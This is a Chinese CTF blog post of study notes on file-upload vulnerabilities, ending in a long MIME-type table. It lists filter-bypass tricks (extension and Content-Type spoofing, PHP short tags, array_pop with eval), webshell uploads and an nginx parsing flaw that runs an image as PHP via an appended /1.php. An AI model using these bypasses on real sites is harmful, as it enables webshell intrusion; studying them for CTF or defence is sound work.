<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>文件上传 | h3110w0r1d's Blog</title><meta name="author" content="h3110w0r1d"><meta name="copyright" content="h3110w0r1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="文件上传经典绕过   更改js代码绕过前端过滤   文件后缀，大小写、如果是apache，可以多写一个不能解析的后缀，php.xxxx   如果后端是通过content-type来进行校验的，可以将content-type修改为可以上传的文件的类型值，后端代码对应为$_FILE(“file”)   绕过php字符内容：使用短标签&#x3D;    绕过空格：使用转义字符’\t’ 或者 进行URL编码   绕">
<meta property="og:type" content="article">
<meta property="og:title" content="文件上传">
<meta property="og:url" content="http://dezhoutorizhao.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
<meta property="og:site_name" content="h3110w0r1d&#39;s Blog">
<meta property="og:description" content="文件上传经典绕过   更改js代码绕过前端过滤   文件后缀，大小写、如果是apache，可以多写一个不能解析的后缀，php.xxxx   如果后端是通过content-type来进行校验的，可以将content-type修改为可以上传的文件的类型值，后端代码对应为$_FILE(“file”)   绕过php字符内容：使用短标签&#x3D;    绕过空格：使用转义字符’\t’ 或者 进行URL编码   绕">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg">
<meta property="article:published_time" content="2022-07-13T09:40:00.078Z">
<meta property="article:modified_time" content="2024-10-25T12:25:11.839Z">
<meta property="article:author" content="h3110w0r1d">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="ing">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dezhoutorizhao.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.0.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        if (name && globalFn[key][name]) return
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '文件上传',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-25 20:25:11'
}</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (true) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">64</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">h3110w0r1d's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">文件上传</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">文件上传</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-13T09:40:00.078Z" title="发表于 2022-07-13 17:40:00">2022-07-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-25T12:25:11.839Z" title="更新于 2024-10-25 20:25:11">2024-10-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">6.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>30分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="经典绕过"><a href="#经典绕过" class="headerlink" title="经典绕过"></a>经典绕过</h2><ol>
<li>  更改js代码绕过前端过滤</li>
<li>  文件后缀，大小写、如果是apache，可以多写一个不能解析的后缀，php.xxxx</li>
<li>  如果后端是通过content-type来进行校验的，可以将content-type修改为可以上传的文件的类型值，后端代码对应为$_FILE(“file”)</li>
<li>  绕过php字符内容：使用短标签= <?= ?></li>
<li>  绕过空格：使用转义字符’\t’ 或者 进行URL编码</li>
<li>  绕过[]:在php中大括号和中括号等价，可以使用{}来绕过对中括号的过滤</li>
<li>  绕过[]和{}：使用array_pop()函数，括号内部写传参的形式，array_pop($_POST);，以字符串的形式返回执行语句，可以配合eval()函数进行使用</li>
<li>  绕过对分号的过滤：最后一句不用带分号，中间的分号可以用?&gt;来进行guo’l</li>
</ol>
<h2 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h2><ol>
<li>存在文件上传的地方，就<strong>有可能有</strong>文件上传的漏洞</li>
<li>上传一个<strong>webshell</strong>(后门)</li>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713180202.png"></li>
</ol>
<h2 id="查找文件上传漏洞"><a href="#查找文件上传漏洞" class="headerlink" title="查找文件上传漏洞"></a>查找文件上传漏洞</h2><ol>
<li>脚本扫描（御剑和菜刀.爬虫）</li>
<li>尝试网站的应用</li>
</ol>
<h2 id="利用类型"><a href="#利用类型" class="headerlink" title="利用类型"></a>利用类型</h2><h3 id="常规类"><a href="#常规类" class="headerlink" title="常规类"></a>常规类</h3><h4 id="扫描获取上传"><a href="#扫描获取上传" class="headerlink" title="扫描获取上传"></a>扫描获取上传</h4><ol>
<li>扫描到敏感目录，上传地址</li>
</ol>
<h4 id="会员中心上传"><a href="#会员中心上传" class="headerlink" title="会员中心上传"></a>会员中心上传</h4><h4 id="后台系统上传"><a href="#后台系统上传" class="headerlink" title="后台系统上传"></a>后台系统上传</h4><h4 id="各种途径上传"><a href="#各种途径上传" class="headerlink" title="各种途径上传"></a>各种途径上传</h4><h3 id="CMS类"><a href="#CMS类" class="headerlink" title="CMS类"></a>CMS类</h3><ol>
<li>一般的文件上传不允许上传脚本格式的<h3 id="编辑器类"><a href="#编辑器类" class="headerlink" title="编辑器类"></a>编辑器类</h3></li>
</ol>
<h3 id="其他类-CVE"><a href="#其他类-CVE" class="headerlink" title="其他类/CVE"></a>其他类/CVE</h3><h3 id="配合解析漏洞下的文件类型后门测试3938"><a href="#配合解析漏洞下的文件类型后门测试3938" class="headerlink" title="配合解析漏洞下的文件类型后门测试3938"></a>配合解析漏洞下的文件类型后门测试3938</h3><ol>
<li>假设上传了一个木马含在图片里的文件,直接访问上传路径解析不出来，按理来说应该解析图片的同时应该解析出phpinfo()的脚本函数，但是没有<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713182905.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713183140.png"></li>
<li>在上传路径后面加上/1.php   (文件的名字不重要，重要的是文件类型是php)<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713182720.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716084818.png"></li>
<li>解析漏洞是看搭建的平台的，例如apache和nginx的</li>
<li>nginx是可以将图片格式作为php格式执行</li>
</ol>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id="Content-type"><a href="#Content-type" class="headerlink" title="Content-type"></a>Content-type</h4><ol>
<li>内容类型，一般指的是网页中存在的Content-Type，用于定义网络文件的类型和网页的编码，决定接收方以什么形式，什么编码解读这个文件</li>
<li>ContentType属性指定响应的 HTTP内容类型。如果未指定 ContentType，默认为TEXT/HTML</li>
<li>application/octet-stream 字节流，浏览器处理字节流的默认方式就是下载<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716120216.png"><pre class="line-numbers language-none"><code class="language-none">最重要的1. application&#x2F;octet-stream 字节流，浏览器处理字节流的默认方式就是下载
       2. image&#x2F;png 图片类型，将会以图片类型解析
&quot;.*&quot;&#x3D;&quot;application&#x2F;octet-stream&quot;
&quot;.001&quot;&#x3D;&quot;application&#x2F;x-001&quot;
&quot;.301&quot;&#x3D;&quot;application&#x2F;x-301&quot;
&quot;.323&quot;&#x3D;&quot;text&#x2F;h323&quot;
&quot;.906&quot;&#x3D;&quot;application&#x2F;x-906&quot;
&quot;.907&quot;&#x3D;&quot;drawing&#x2F;907&quot;
&quot;.a11&quot;&#x3D;&quot;application&#x2F;x-a11&quot;
&quot;.acp&quot;&#x3D;&quot;audio&#x2F;x-mei-aac&quot;
&quot;.ai&quot;&#x3D;&quot;application&#x2F;postscript&quot;
&quot;.aif&quot;&#x3D;&quot;audio&#x2F;aiff&quot;
&quot;.aifc&quot;&#x3D;&quot;audio&#x2F;aiff&quot;
&quot;.aiff&quot;&#x3D;&quot;audio&#x2F;aiff&quot;
&quot;.anv&quot;&#x3D;&quot;application&#x2F;x-anv&quot;
&quot;.asa&quot;&#x3D;&quot;text&#x2F;asa&quot;
&quot;.asf&quot;&#x3D;&quot;video&#x2F;x-ms-asf&quot;
&quot;.asp&quot;&#x3D;&quot;text&#x2F;asp&quot;
&quot;.asx&quot;&#x3D;&quot;video&#x2F;x-ms-asf&quot;
&quot;.au&quot;&#x3D;&quot;audio&#x2F;basic&quot;
&quot;.avi&quot;&#x3D;&quot;video&#x2F;avi&quot;
&quot;.awf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.workflow&quot;
&quot;.biz&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.bmp&quot;&#x3D;&quot;application&#x2F;x-bmp&quot;
&quot;.bot&quot;&#x3D;&quot;application&#x2F;x-bot&quot;
&quot;.c4t&quot;&#x3D;&quot;application&#x2F;x-c4t&quot;
&quot;.c90&quot;&#x3D;&quot;application&#x2F;x-c90&quot;
&quot;.cal&quot;&#x3D;&quot;application&#x2F;x-cals&quot;
&quot;.cat&quot;&#x3D;&quot;application&#x2F;s-pki.seccat&quot;
&quot;.cdf&quot;&#x3D;&quot;application&#x2F;x-netcdf&quot;
&quot;.cdr&quot;&#x3D;&quot;application&#x2F;x-cdr&quot;
&quot;.cel&quot;&#x3D;&quot;application&#x2F;x-cel&quot;
&quot;.cer&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;
&quot;.cg4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;
&quot;.cgm&quot;&#x3D;&quot;application&#x2F;x-cgm&quot;
&quot;.cit&quot;&#x3D;&quot;application&#x2F;x-cit&quot;
&quot;.class&quot;&#x3D;&quot;java&#x2F;*&quot;
&quot;.cml&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.cmp&quot;&#x3D;&quot;application&#x2F;x-cmp&quot;
&quot;.cmx&quot;&#x3D;&quot;application&#x2F;x-cmx&quot;
&quot;.cot&quot;&#x3D;&quot;application&#x2F;x-cot&quot;
&quot;.crl&quot;&#x3D;&quot;application&#x2F;pkix-crl&quot;
&quot;.crt&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;
&quot;.csi&quot;&#x3D;&quot;application&#x2F;x-csi&quot;
&quot;.css&quot;&#x3D;&quot;text&#x2F;css&quot;
&quot;.cut&quot;&#x3D;&quot;application&#x2F;x-cut&quot;
&quot;.dbf&quot;&#x3D;&quot;application&#x2F;x-dbf&quot;
&quot;.dbm&quot;&#x3D;&quot;application&#x2F;x-dbm&quot;
&quot;.dbx&quot;&#x3D;&quot;application&#x2F;x-dbx&quot;
&quot;.dcd&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.dcx&quot;&#x3D;&quot;application&#x2F;x-dcx&quot;
&quot;.der&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;
&quot;.dgn&quot;&#x3D;&quot;application&#x2F;x-dgn&quot;
&quot;.dib&quot;&#x3D;&quot;application&#x2F;x-dib&quot;
&quot;.dll&quot;&#x3D;&quot;application&#x2F;x-msdownload&quot;
&quot;.doc&quot;&#x3D;&quot;application&#x2F;msword&quot;
&quot;.dot&quot;&#x3D;&quot;application&#x2F;msword&quot;
&quot;.drw&quot;&#x3D;&quot;application&#x2F;x-drw&quot;
&quot;.dtd&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.dwf&quot;&#x3D;&quot;Model&#x2F;vnd.dwf&quot;
&quot;.dwf&quot;&#x3D;&quot;application&#x2F;x-dwf&quot;
&quot;.dwg&quot;&#x3D;&quot;application&#x2F;x-dwg&quot;
&quot;.dxb&quot;&#x3D;&quot;application&#x2F;x-dxb&quot;
&quot;.dxf&quot;&#x3D;&quot;application&#x2F;x-dxf&quot;
&quot;.edn&quot;&#x3D;&quot;application&#x2F;vnd.adobe.edn&quot;
&quot;.emf&quot;&#x3D;&quot;application&#x2F;x-emf&quot;
&quot;.eml&quot;&#x3D;&quot;message&#x2F;rfc822&quot;
&quot;.ent&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.epi&quot;&#x3D;&quot;application&#x2F;x-epi&quot;
&quot;.eps&quot;&#x3D;&quot;application&#x2F;x-ps&quot;
&quot;.eps&quot;&#x3D;&quot;application&#x2F;postscript&quot;
&quot;.etd&quot;&#x3D;&quot;application&#x2F;x-ebx&quot;
&quot;.exe&quot;&#x3D;&quot;application&#x2F;x-msdownload&quot;
&quot;.fax&quot;&#x3D;&quot;image&#x2F;fax&quot;
&quot;.fdf&quot;&#x3D;&quot;application&#x2F;vnd.fdf&quot;
&quot;.fif&quot;&#x3D;&quot;application&#x2F;fractals&quot;
&quot;.fo&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.frm&quot;&#x3D;&quot;application&#x2F;x-frm&quot;
&quot;.g4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;
&quot;.gbr&quot;&#x3D;&quot;application&#x2F;x-gbr&quot;
&quot;.gcd&quot;&#x3D;&quot;application&#x2F;x-gcd&quot;
&quot;.gif&quot;&#x3D;&quot;image&#x2F;gif&quot;
&quot;.gl2&quot;&#x3D;&quot;application&#x2F;x-gl2&quot;
&quot;.gp4&quot;&#x3D;&quot;application&#x2F;x-gp4&quot;
&quot;.hgl&quot;&#x3D;&quot;application&#x2F;x-hgl&quot;
&quot;.hmr&quot;&#x3D;&quot;application&#x2F;x-hmr&quot;
&quot;.hpg&quot;&#x3D;&quot;application&#x2F;x-hpgl&quot;
&quot;.hpl&quot;&#x3D;&quot;application&#x2F;x-hpl&quot;
&quot;.hqx&quot;&#x3D;&quot;application&#x2F;mac-binhex40&quot;
&quot;.hrf&quot;&#x3D;&quot;application&#x2F;x-hrf&quot;
&quot;.hta&quot;&#x3D;&quot;application&#x2F;hta&quot;
&quot;.htc&quot;&#x3D;&quot;text&#x2F;x-component&quot;
&quot;.htm&quot;&#x3D;&quot;text&#x2F;html&quot;
&quot;.html&quot;&#x3D;&quot;text&#x2F;html&quot;
&quot;.htt&quot;&#x3D;&quot;text&#x2F;webviewhtml&quot;
&quot;.htx&quot;&#x3D;&quot;text&#x2F;html&quot;
&quot;.icb&quot;&#x3D;&quot;application&#x2F;x-icb&quot;
&quot;.ico&quot;&#x3D;&quot;image&#x2F;x-icon&quot;
&quot;.ico&quot;&#x3D;&quot;application&#x2F;x-ico&quot;
&quot;.iff&quot;&#x3D;&quot;application&#x2F;x-iff&quot;
&quot;.ig4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;
&quot;.igs&quot;&#x3D;&quot;application&#x2F;x-igs&quot;
&quot;.iii&quot;&#x3D;&quot;application&#x2F;x-iphone&quot;
&quot;.img&quot;&#x3D;&quot;application&#x2F;x-img&quot;
&quot;.ins&quot;&#x3D;&quot;application&#x2F;x-internet-signup&quot;
&quot;.isp&quot;&#x3D;&quot;application&#x2F;x-internet-signup&quot;
&quot;.IVF&quot;&#x3D;&quot;video&#x2F;x-ivf&quot;
&quot;.java&quot;&#x3D;&quot;java&#x2F;*&quot;
&quot;.jfif&quot;&#x3D;&quot;image&#x2F;jpeg&quot;
&quot;.jpe&quot;&#x3D;&quot;image&#x2F;jpeg&quot;
&quot;.jpe&quot;&#x3D;&quot;application&#x2F;x-jpe&quot;
&quot;.jpeg&quot;&#x3D;&quot;image&#x2F;jpeg&quot;
&quot;.jpg&quot;&#x3D;&quot;image&#x2F;jpeg&quot;
&quot;.jpg&quot;&#x3D;&quot;application&#x2F;x-jpg&quot;
&quot;.js&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;
&quot;.jsp&quot;&#x3D;&quot;text&#x2F;html&quot;
&quot;.la1&quot;&#x3D;&quot;audio&#x2F;x-liquid-file&quot;
&quot;.lar&quot;&#x3D;&quot;application&#x2F;x-laplayer-reg&quot;
&quot;.latex&quot;&#x3D;&quot;application&#x2F;x-latex&quot;
&quot;.lavs&quot;&#x3D;&quot;audio&#x2F;x-liquid-secure&quot;
&quot;.lbm&quot;&#x3D;&quot;application&#x2F;x-lbm&quot;
&quot;.lmsff&quot;&#x3D;&quot;audio&#x2F;x-la-lms&quot;
&quot;.ls&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;
&quot;.ltr&quot;&#x3D;&quot;application&#x2F;x-ltr&quot;
&quot;.m1v&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;
&quot;.m2v&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;
&quot;.m3u&quot;&#x3D;&quot;audio&#x2F;mpegurl&quot;
&quot;.m4e&quot;&#x3D;&quot;video&#x2F;mpeg4&quot;
&quot;.mac&quot;&#x3D;&quot;application&#x2F;x-mac&quot;
&quot;.man&quot;&#x3D;&quot;application&#x2F;x-troff-man&quot;
&quot;.math&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.mdb&quot;&#x3D;&quot;application&#x2F;msaccess&quot;
&quot;.mdb&quot;&#x3D;&quot;application&#x2F;x-mdb&quot;
&quot;.mfp&quot;&#x3D;&quot;application&#x2F;x-shockwave-flash&quot;
&quot;.mht&quot;&#x3D;&quot;message&#x2F;rfc822&quot;
&quot;.mhtml&quot;&#x3D;&quot;message&#x2F;rfc822&quot;
&quot;.mi&quot;&#x3D;&quot;application&#x2F;x-mi&quot;
&quot;.mid&quot;&#x3D;&quot;audio&#x2F;mid&quot;
&quot;.midi&quot;&#x3D;&quot;audio&#x2F;mid&quot;
&quot;.mil&quot;&#x3D;&quot;application&#x2F;x-mil&quot;
&quot;.mml&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.mnd&quot;&#x3D;&quot;audio&#x2F;x-musicnet-download&quot;
&quot;.mns&quot;&#x3D;&quot;audio&#x2F;x-musicnet-stream&quot;
&quot;.mocha&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;
&quot;.movie&quot;&#x3D;&quot;video&#x2F;x-sgi-movie&quot;
&quot;.mp1&quot;&#x3D;&quot;audio&#x2F;mp1&quot;
&quot;.mp2&quot;&#x3D;&quot;audio&#x2F;mp2&quot;
&quot;.mp2v&quot;&#x3D;&quot;video&#x2F;mpeg&quot;
&quot;.mp3&quot;&#x3D;&quot;audio&#x2F;mp3&quot;
&quot;.mp4&quot;&#x3D;&quot;video&#x2F;mp4&quot;
&quot;.mpa&quot;&#x3D;&quot;video&#x2F;x-mpg&quot;
&quot;.mpd&quot;&#x3D;&quot;application&#x2F;-project&quot;
&quot;.mpe&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;
&quot;.mpeg&quot;&#x3D;&quot;video&#x2F;mpg&quot;
&quot;.mpg&quot;&#x3D;&quot;video&#x2F;mpg&quot;
&quot;.mpga&quot;&#x3D;&quot;audio&#x2F;rn-mpeg&quot;
&quot;.mpp&quot;&#x3D;&quot;application&#x2F;-project&quot;
&quot;.mps&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;
&quot;.mpt&quot;&#x3D;&quot;application&#x2F;-project&quot;
&quot;.mpv&quot;&#x3D;&quot;video&#x2F;mpg&quot;
&quot;.mpv2&quot;&#x3D;&quot;video&#x2F;mpeg&quot;
&quot;.mpw&quot;&#x3D;&quot;application&#x2F;s-project&quot;
&quot;.mpx&quot;&#x3D;&quot;application&#x2F;-project&quot;
&quot;.mtx&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.mxp&quot;&#x3D;&quot;application&#x2F;x-mmxp&quot;
&quot;.net&quot;&#x3D;&quot;image&#x2F;pnetvue&quot;
&quot;.nrf&quot;&#x3D;&quot;application&#x2F;x-nrf&quot;
&quot;.nws&quot;&#x3D;&quot;message&#x2F;rfc822&quot;
&quot;.odc&quot;&#x3D;&quot;text&#x2F;x-ms-odc&quot;
&quot;.out&quot;&#x3D;&quot;application&#x2F;x-out&quot;
&quot;.p10&quot;&#x3D;&quot;application&#x2F;pkcs10&quot;
&quot;.p12&quot;&#x3D;&quot;application&#x2F;x-pkcs12&quot;
&quot;.p7b&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certificates&quot;
&quot;.p7c&quot;&#x3D;&quot;application&#x2F;pkcs7-mime&quot;
&quot;.p7m&quot;&#x3D;&quot;application&#x2F;pkcs7-mime&quot;
&quot;.p7r&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certreqresp&quot;
&quot;.p7s&quot;&#x3D;&quot;application&#x2F;pkcs7-signature&quot;
&quot;.pc5&quot;&#x3D;&quot;application&#x2F;x-pc5&quot;
&quot;.pci&quot;&#x3D;&quot;application&#x2F;x-pci&quot;
&quot;.pcl&quot;&#x3D;&quot;application&#x2F;x-pcl&quot;
&quot;.pcx&quot;&#x3D;&quot;application&#x2F;x-pcx&quot;
&quot;.pdf&quot;&#x3D;&quot;application&#x2F;pdf&quot;
&quot;.pdx&quot;&#x3D;&quot;application&#x2F;vnd.adobe.pdx&quot;
&quot;.pfx&quot;&#x3D;&quot;application&#x2F;x-pkcs12&quot;
&quot;.pgl&quot;&#x3D;&quot;application&#x2F;x-pgl&quot;
&quot;.pic&quot;&#x3D;&quot;application&#x2F;x-pic&quot;
&quot;.pko&quot;&#x3D;&quot;application-pki.pko&quot;
&quot;.pl&quot;&#x3D;&quot;application&#x2F;x-perl&quot;
&quot;.plg&quot;&#x3D;&quot;text&#x2F;html&quot;
&quot;.pls&quot;&#x3D;&quot;audio&#x2F;scpls&quot;
&quot;.plt&quot;&#x3D;&quot;application&#x2F;x-plt&quot;
&quot;.png&quot;&#x3D;&quot;image&#x2F;png&quot;
&quot;.png&quot;&#x3D;&quot;application&#x2F;x-png&quot;
&quot;.pot&quot;&#x3D;&quot;applications-powerpoint&quot;
&quot;.ppa&quot;&#x3D;&quot;application&#x2F;vs-powerpoint&quot;
&quot;.ppm&quot;&#x3D;&quot;application&#x2F;x-ppm&quot;
&quot;.pps&quot;&#x3D;&quot;application-powerpoint&quot;
&quot;.ppt&quot;&#x3D;&quot;applications-powerpoint&quot;
&quot;.ppt&quot;&#x3D;&quot;application&#x2F;x-ppt&quot;
&quot;.pr&quot;&#x3D;&quot;application&#x2F;x-pr&quot;
&quot;.prf&quot;&#x3D;&quot;application&#x2F;pics-rules&quot;
&quot;.prn&quot;&#x3D;&quot;application&#x2F;x-prn&quot;
&quot;.prt&quot;&#x3D;&quot;application&#x2F;x-prt&quot;
&quot;.ps&quot;&#x3D;&quot;application&#x2F;x-ps&quot;
&quot;.ps&quot;&#x3D;&quot;application&#x2F;postscript&quot;
&quot;.ptn&quot;&#x3D;&quot;application&#x2F;x-ptn&quot;
&quot;.pwz&quot;&#x3D;&quot;application&#x2F;powerpoint&quot;
&quot;.r3t&quot;&#x3D;&quot;text&#x2F;vnd.rn-realtext3d&quot;
